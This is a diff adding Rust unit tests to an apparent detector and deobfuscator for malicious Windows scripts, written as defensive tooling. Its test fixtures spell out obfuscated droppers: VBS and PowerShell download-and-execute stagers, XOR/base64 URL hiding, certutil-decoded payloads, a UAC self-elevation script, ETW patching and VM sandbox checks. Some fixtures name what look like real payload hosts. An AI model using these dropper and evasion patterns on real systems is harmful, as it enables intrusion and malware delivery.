+        );
+    }
+
+    #[test]
     fn copy_b_compact_multi_source_concat_tracked() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -29268,6 +52168,66 @@ wscript //nologo "child.vbs"
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "structured URL double-emitted as generic: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn grouped_echo_vbs_payload_is_reported_as_extracted_vbs() {
+        let url = "https://grouped-vbs.example/payload.txt";
+        let script = format!(
+            r#"@echo off
+set "out=C:\Temp\stage.vbs"
+>"%out%" (
+echo Dim u, x
+echo u = "{url}"
+echo Set x = CreateObject^("MSXML2.XMLHTTP"^)
+echo x.open "GET", u, False
+echo x.send
+echo ExecuteGlobal x.responseText
+)
+start "" /b wscript //nologo "%out%"
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == url)),
+            "structured child VBS download missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.extracted_vbs.iter().any(|payload| {
+                let text = String::from_utf8_lossy(payload);
+                text.contains("CreateObject(\"MSXML2.XMLHTTP\")")
+                    && text.contains("ExecuteGlobal x.responseText")
+            }),
+            "grouped echo VBS was scanned but not reported: {:?}",
+            report.extracted_vbs
+        );
+    }
+
+    #[test]
+    fn echoed_uac_vbs_scan_does_not_report_redirect_residue_as_vbs_payload() {
+        let script = br#"@echo off
+echo Set UAC = CreateObject("Shell.Application") > "%TEMP%\getadmin.vbs"
+echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%TEMP%\getadmin.vbs"
+start "" wscript "%TEMP%\getadmin.vbs"
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::SelfElevation { .. })),
+            "expected echoed ShellExecute runas to remain detectable as self-elevation: {:?}",
+            report.traits
+        );
+        assert!(
+            report.extracted_vbs.is_empty(),
+            "redirect residue should not be reported as extracted VBS: {:?}",
+            report.extracted_vbs
         );
     }
 
@@ -29867,6 +52827,34 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn powershell_url_assignment_is_not_typed_as_download() {
+        let script =
+            br#"powershell -Command "$url='http://ps-assignment.example'; Write-Host $url""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::UrlVariable { name, url, .. }
+                        if name == "url" && url == "http://ps-assignment.example"
+                )
+            }),
+            "PowerShell URL assignment did not emit UrlVariable: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://ps-assignment.example" && dst.is_none()
+                )
+            }),
+            "PowerShell URL assignment was incorrectly typed as Download: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -31069,6 +54057,58 @@ vaultcmd /listcreds:"Windows Credentials"
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "mangled DownloadString URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn mangled_webclient_download_trims_trailing_literal_space() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://typo-webclient-trim.example/payload.dat";
+        crate::deob_scan::scan_deob_text(&format!(r#"$wc.DownloadFile('{url} ',$dst)"#), &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, cmd, .. }
+                    if cmd == "powershell-webclient-typo" && src == url)
+            }),
+            "trimmed typo WebClient URL not emitted: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, cmd, .. }
+                    if cmd == "powershell-webclient-typo" && src.ends_with(' '))
+            }),
+            "trailing-space typo WebClient URL leaked: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn mangled_webclient_download_stops_at_url_separator() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let first = "https://typo-webclient-first.example/payload.dat";
+        let second = "http://192.0.2.44/payload.dat";
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"$wc.DownloadFile('{first}>{second} ',$dst)"#),
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, cmd, .. }
+                    if cmd == "powershell-webclient-typo" && src == first)
+            }),
+            "clean first URL was not emitted: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, cmd, .. }
+                    if cmd == "powershell-webclient-typo" && src.contains('>'))
+            }),
+            "separator-glued typo WebClient URL leaked: {:?}",
             env.traits
         );
     }
@@ -33505,6 +56545,25 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
             generic_count, 0,
             "echoed VBS URL double-emitted: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_decoded_vbs_powershell_payload_is_scanned_after_vbs_pass() {
+        let script = br#"echo U2V0IHNoID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCmNtZCA9ICJwb3dlcnNoZWxsIC1jb21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgaHR0cHM6Ly9sYXRlLXZicy1wcy5leGFtcGxlL3AiDQpzaC5SdW4gY21kLCAwLCBGYWxzZQ0K > stage.b64
+certutil -decode stage.b64 stage.vbs
+wscript stage.vbs
+"#;
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://late-vbs-ps.example/p"
+                )
+            }),
+            "late VBS PowerShell payload was not rescanned: {:?}",
+            report.traits
         );
     }
 
@@ -36916,6 +59975,26 @@ powershell -Command "Set-WmiInstance -ComputerName='adminbox.example' -Class Win
     }
 
     #[test]
+    fn vm_sandbox_checks_emit_anti_analysis_traits() {
+        let script = br#"powershell.exe -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }"
+if "%model%"=="VirtualBox" exit
+"#;
+        let report = analyze(script, &Config::default());
+
+        for target in ["Win32_ComputerSystem:Virtual", "VirtualBox"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::AntiAnalysis { technique, target: found, .. }
+                        if technique == "vm-sandbox-check" && found == target
+                )),
+                "missing AntiAnalysis marker {target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_wmi_computername_list_emits_remote_exec_for_each_host() {
         let script = br#"powershell -Command "Invoke-WmiMethod -ComputerName host1.example,host2.example -Class Win32_Process -Name Create -ArgumentList 'cmd /c hostname'"
 "#;
@@ -37061,6 +60140,15 @@ start /b /min cmd /c C:\ProgramData\7zz.exe x -y C:\ProgramData\tempy.7z -oC:\Pr
                 report.traits
             );
         }
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ArchiveExtraction { cmd, .. }
+                    if cmd == "[System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document')"
+            )),
+            "ExtractToDirectory command context was truncated: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -37372,6 +60460,31 @@ powershell -Command "New-Service -Name UpdateSvc -BinaryPathName 'cmd.exe /c cal
                     if service_name == "UpdateSvc" && bin_path == "cmd.exe /c calc.exe"
             )),
             "PowerShell New-Service install trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_etw_patch_defender_evasion_records_target() {
+        let script = br#"powershell -Command "$api = 'EtwEventWrite'; $provider = 'System.Diagnostics.Eventing.EventProvider'""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "etw-patch" && target == "EtwEventWrite"
+            )),
+            "ETW patch trait should carry matched target: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "etw-patch" && target.is_empty()
+            )),
+            "ETW patch trait should not use an empty target: {:?}",
             report.traits
         );
     }
@@ -41722,6 +64835,120 @@ Invoke-WebRequest -Uri $url"#;
             report.traits
         );
     }
+
+    #[test]
+    fn do_until_stride_decoder_with_self_assignment_recovers_url() {
+        let url = "https://stride-self.example/a";
+        let mut carrier = String::from("xxx");
+        for ch in url.chars() {
+            carrier.push(ch);
+            carrier.push_str("xxx");
+        }
+        let inner = format!(
+            r#"function dec($value) {{
+    $i = 3;
+    $i = $i;
+    do {{
+        $out += $value[$i];
+        $i += 4;
+    }} until (!$value[$i])
+    $out
+}}
+$url = dec '{carrier}';
+Invoke-WebRequest -Uri $url"#
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(&inner));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "self-assignment stride decoder didn't recover URL: {:?}\nnormalized ps:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
+    fn keyed_base64_xor_string_fragments_recover_url() {
+        let url = "https://keyed-fragment.example/payload";
+        let key = [76_u8, 97, 118, 115, 115];
+        let encoded = base64::engine::general_purpose::STANDARD.encode(
+            url.as_bytes()
+                .iter()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect::<Vec<u8>>(),
+        );
+        let inner = format!(
+            r#"$rikoche=@(76,97,118,115,115);
+function dunpick($byte,$keyByte) {{
+    [int]$byte -bxor [int]$keyByte
+}}
+function Splenich($playboyen,$unmurmu=0) {{
+    $russ=[Convert]::FromBase64String($playboyen);
+    for($nonspu=0; $nonspu -lt $russ.Length; $nonspu++) {{
+        $russ[$nonspu] = dunpick $russ[$nonspu] $rikoche[$nonspu%5]
+    }}
+    [Text.Encoding]::ASCII.GetString($russ)
+}}
+$pacific=Splenich '{encoded}';
+Invoke-WebRequest -Uri $pacific"#
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(&inner));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "keyed base64 XOR fragment URL was not recovered: {:?}\nnormalized ps:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
+    fn standalone_inline_powershell_keyed_xor_skips_cmd_drive_and_recovers_url() {
+        let url =
+            "https://drive.google.com/uc?export=download&id=1vPajo0jzKSwGR_x2e2OIuxGJVR_yA4sw";
+        let key = [76_u8, 97, 118, 115, 115];
+        let encoded = base64::engine::general_purpose::STANDARD.encode(
+            url.as_bytes()
+                .iter()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect::<Vec<u8>>(),
+        );
+        let script = format!(
+            r#"powershell.exe -windowstyle 1 "$rikoche=@(76,97,118,115,115); function dunpick($byte,$keyByte) {{ [int]$byte -bxor [int]$keyByte }}; function Splenich($playboyen,$unmurmu=0) {{ $russ=[Convert]::FromBase64String($playboyen); for($nonspu=0; $nonspu -lt $russ.Length; $nonspu++) {{ $russ[$nonspu] = dunpick $russ[$nonspu] $rikoche[$nonspu%5] }}; [Text.Encoding]::ASCII.GetString($russ) }}; $pacific=Splenich '{encoded}'; (New-Object Net.WebClient).DownloadFile($pacific,$env:TEMP+'\p.exe'); {filler}""#,
+            filler = "A".repeat(2400)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long inline PowerShell command line"),
+            "standalone inline PowerShell was not summarized:\n{}",
+            report.deobfuscated
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "standalone inline keyed base64 XOR URL was not recovered: {:?}\nnormalized ps:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
 }
 
 #[cfg(test)]
@@ -41868,6 +65095,17 @@ mod ps_alias_tests {
         let out = expand_aliases_if_ps(alias_only);
         assert!(out.contains("Invoke-Expression"), "got: {}", out);
         assert!(out.contains("Invoke-WebRequest"), "got: {}", out);
+    }
+
+    #[test]
+    fn oversized_alias_flood_is_not_expanded() {
+        use crate::ps_alias::expand_aliases_if_ps;
+        let mut input = String::from("powershell -c ");
+        for _ in 0..20_000 {
+            input.push_str("iex ");
+        }
+
+        assert_eq!(expand_aliases_if_ps(&input), input);
     }
 
     #[test]
@@ -42153,6 +65391,31 @@ mod certutil_decoded_js_tests {
     }
 
     #[test]
+    fn certutil_bare_js_fallback_skips_scheme_variant_already_known() {
+        let plain =
+            r#"var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//evil.example/?1/");"#;
+        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
+        let deob = format!("echo {b64} > f.js\ncertutil -f -decode f.js f.js\ncall f.js\n");
+        let mut env = Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "(js #0) decoded".to_string(),
+            src: "http://evil.example/?1/".to_string(),
+            dst: None,
+        });
+        crate::deob_scan::scan_certutil_decoded_js(&deob, &mut env);
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { cmd, src, .. }
+                        if cmd == "certutil-decode-js" && src == "https://evil.example/?1/"
+                )
+            }),
+            "certutil fallback emitted conflicting scheme duplicate: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn gate_requires_certutil_call() {
         // echo + base64 alone without a certutil-decode should not fire.
         let plain = r#"GetObject("//evil.example/?1/")"#;
@@ -42335,6 +65598,42 @@ mod certutil_decoded_js_tests {
                 )
             }),
             "damaged payload-extension URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn damaged_scheme_public_ip_payload_url_is_recovered() {
+        let mut env = Environment::new(&Config::default());
+        let deob = r#"-"-'://5.252.155.64/din.exe'-.""#;
+        crate::deob_scan::scan_damaged_scheme_download_urls(deob, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if line_hint == "damaged-scheme-download-context"
+                        && src == "https://5.252.155.64/din.exe"
+                )
+            }),
+            "damaged public-IP payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn damaged_scheme_invoked_script_endpoint_is_recovered() {
+        let mut env = Environment::new(&Config::default());
+        let deob = r#"/-"--.;(-.).('://hpsj.firewall-gateway.net:80/hpjs.php');""#;
+        crate::deob_scan::scan_damaged_scheme_download_urls(deob, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if line_hint == "damaged-scheme-download-context"
+                        && src == "https://hpsj.firewall-gateway.net:80/hpjs.php"
+                )
+            }),
+            "damaged invoked script endpoint missed: {:?}",
             env.traits
         );
     }
@@ -42552,6 +65851,50 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS script: URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_getobject_split_script_http_argument_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"try{var c='script:';d='hTtP:';GetObject(c+d+'//hta-inline.example/?1/');}catch(e){}close();"#.to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://hta-inline.example/?1/"
+            )
+        });
+        assert!(
+            has,
+            "JS GetObject split script/http argument URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deobfuscated_hta_script_tag_is_queued_for_js_scan() {
+        let script = br#"start /MIN cmd /V/D/c "seT sKk=script&&seT px=mshta&&SEt CMZO=%Public%\Videos\^kRT&&SEt HVVT=^<!sKk!^>try{vQ4Bar c='!sKk!:';d='hQ4BTtP:';GQ4BetObjQ4Bect(c+d+'&&sET L9X=YSUTZYSUTZhta-inline.exampleYSUTZ?1YSUTZ');}catch(e){}close();^</!sKk!^>&&sEt/^p 0IIT="!HVVT:Q4B=!!L9X:YSUTZ=/!"<nul > !CMZO!.Hta|start /MIN CMD /c !px! !CMZO!.HtA ""#;
+        let report = crate::analyze(script, &Config::default());
+        assert!(
+            report.extracted_jscript.iter().any(|payload| {
+                String::from_utf8_lossy(payload)
+                    .contains("GetObject(c+d+'//hta-inline.example/?1/')")
+            }),
+            "deobfuscated HTA script body was not extracted: {:?}\ndeob:\n{}",
+            report.extracted_jscript,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "http://hta-inline.example/?1/"
+                )
+            }),
+            "deobfuscated HTA script body was not scanned for downloads: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 
     #[test]
@@ -45586,6 +68929,7 @@ task["Run"]("mshta js-bracket-run-fp.example/payload.hta");"#
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod cmd_path_flags_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
 
@@ -45600,6 +68944,47 @@ mod cmd_path_flags_tests {
             env.exec_cmd.iter().any(|c| c.contains("echo inner")),
             "concat-flag inner not extracted: {:?}",
             env.exec_cmd
+        );
+    }
+
+    #[test]
+    fn recursive_cmd_child_replaces_caret_polluted_wrapper_output() {
+        let script = br#"start /MIN cmd %ComSpec% /V/D/c "MD C:\l886EQW\>nul&&s^eT FIHL=C:\l886EQW\^l886EQW&&echo AAAA>!FIHL!.^Js&&certutil -f -decode !FIHL!.^Js !FIHL!.^Js&&CMD /c !FIHL!.^Js""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report.deobfuscated.contains("s^eT")
+                && !report.deobfuscated.contains(".^Js")
+                && report
+                    .deobfuscated
+                    .contains("seT FIHL=C:\\l886EQW\\l886EQW")
+                && report.deobfuscated.contains("C:\\l886EQW\\l886EQW.Js"),
+            "caret-polluted wrapper should be replaced by clean child output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn start_comspec_pipeline_wrapper_renders_expanded_set_p_child_only() {
+        let script = br#"start /MIN %ComSpec% /V/D/c "se^T NOISE=x&&s^eT TUUH=%Public%\V^id^eos\^eQcF9WM&&S^Et FAMV=tr^y^{^vjwzar c='sc^ri^pt^:';d='hjwzTt^P:';Gjwzet^Ob^jjwzec^t(c+d+'&&s^ET TAIL=RDQUCRDQUCskai1d.xd7e407p4gt6u.dateRDQUC?1RDQUC');}c^a^tch^(e^){^}^;&&s^Et/^p OUT="!FAMV:jwz=!!TAIL:RDQUC=/!"<n^ul > !TUUH!.^j^S|ca^l^l s^t^a^rt !TUUH!.j^S "|c^M^d"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.deobfuscated.contains("se^T")
+                && !report.deobfuscated.contains("s^eT")
+                && !report.deobfuscated.contains("FAMV=")
+                && !report.deobfuscated.contains("TAIL="),
+            "wrapper/staging noise should be suppressed:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("GetObject(c+d+'//skai1d.xd7e407p4gt6u.date/?1/')")
+                && report
+                    .deobfuscated
+                    .contains(r"call start C:\Users\Public\Videos\eQcF9WM.jS"),
+            "expanded final JScript write/run command missing:\n{}",
+            report.deobfuscated
         );
     }
 }
@@ -45665,6 +69050,43 @@ mod disguised_binary_tests {
     }
 
     #[test]
+    fn analyze_disguised_pe_returns_without_script_timeout() {
+        let mut buf = vec![0u8; 2 * 1024 * 1024];
+        buf[0] = b'M';
+        buf[1] = b'Z';
+        buf[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        buf[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let url = b"http://pe-disguised.example/payload";
+        buf[4096..4096 + url.len()].copy_from_slice(url);
+
+        let report = analyze(&buf, &Config::default());
+
+        assert!(report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::DisguisedBinary { format, size }
+                    if format == "pe" && *size == buf.len() as u64
+            )
+        }));
+        assert!(report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "http://pe-disguised.example/payload"
+                        && line_hint == "binary-input"
+            )
+        }));
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "PE fast path should not time out: {:?}",
+            report.traits
+        );
+        assert_eq!(report.recovered_pe.len(), 1);
+        assert_eq!(report.recovered_pe[0].0, "disguised-pe-input");
+        assert!(report.deobfuscated.is_empty());
+    }
+
+    #[test]
     fn analyze_disguised_pdf_recovers_blob_and_scans_urls() {
         let mut buf = b"%PDF-1.7\n".to_vec();
         buf.extend_from_slice(b"stream http://pdf-disguised.example/payload.exe endstream\n");
@@ -45690,6 +69112,141 @@ mod disguised_binary_tests {
         assert_eq!(report.recovered_pe[0].0, "disguised-pdf-input");
         assert_eq!(report.recovered_pe[0].1, buf);
         assert!(report.deobfuscated.is_empty());
+    }
+
+    #[test]
+    fn github_blob_html_wrapper_analyzes_raw_lines_instead_of_page_shell() {
+        let embedded = serde_json::json!({
+            "payload": {
+                "path": "f.png",
+                "blob": {
+                    "rawBlobUrl": "https://github.com/abarekl1/i/raw/refs/heads/main/f.png",
+                    "rawLines": [
+                        "@echo off",
+                        "start /min powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('https://github-wrapper.example/payload.exe', '%TEMP%\\\\payload.exe')\""
+                    ]
+                }
+            }
+        });
+        let html = format!(
+            r#"<!DOCTYPE html>
+<html><head><title>i/f.png at main</title></head>
+<body><script type="application/json" data-target="react-app.embeddedData">{}</script>
+<script>var noisy = "DownloadFile('https://github-ui.example/not-payload')";</script>
+</body></html>"#,
+            embedded
+        );
+
+        let report = analyze(html.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .starts_with("rem omitted GitHub HTML blob wrapper for f.png"),
+            "wrapper summary missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("@echo off")
+                && report
+                    .deobfuscated
+                    .contains("github-wrapper.example/payload.exe"),
+            "rawLines content should be analyzed/rendered:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("<!DOCTYPE html>")
+                && !report
+                    .deobfuscated
+                    .contains("github-ui.example/not-payload"),
+            "GitHub page shell should not pollute deob output:\n{}",
+            report.deobfuscated
+        );
+        assert!(report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://github-wrapper.example/payload.exe"
+            )
+        }));
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://github-ui.example/not-payload"
+                )
+            }),
+            "GitHub UI script should not be scanned as payload: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn github_large_blob_html_wrapper_is_summarized_without_scanning_page_shell() {
+        let embedded = serde_json::json!({
+            "payload": {
+                "path": "ok.bat",
+                "blob": {
+                    "rawLines": null,
+                    "large": true,
+                    "rawBlobUrl": "https://github.com/sgbhd/dharr/raw/refs/heads/main/ok.bat",
+                    "displayName": "ok.bat",
+                    "headerInfo": {
+                        "blobSize": "5.3 MB"
+                    }
+                }
+            }
+        });
+        let html = format!(
+            r#"<!DOCTYPE html>
+<html><head><title>dharr/ok.bat at main</title></head>
+<body><script type="application/json" data-target="react-app.embeddedData">{}</script>
+<script>var noisy = "DownloadFile('https://github-ui.example/not-payload')";</script>
+</body></html>"#,
+            embedded
+        );
+
+        let report = analyze(html.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .starts_with("rem omitted GitHub HTML blob wrapper for ok.bat"),
+            "large wrapper summary missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("<!DOCTYPE html>")
+                && !report
+                    .deobfuscated
+                    .contains("github-ui.example/not-payload"),
+            "GitHub page shell should not pollute deob output:\n{}",
+            report.deobfuscated
+        );
+        assert!(report
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::LineTruncated { .. })));
+        assert!(report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "https://github.com/sgbhd/dharr/raw/refs/heads/main/ok.bat"
+                        && line_hint == "github-raw-blob"
+            )
+        }));
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://github-ui.example/not-payload"
+                )
+            }),
+            "GitHub UI script should not be scanned as payload: {:?}",
+            report.traits
+        );
     }
 
     #[test]
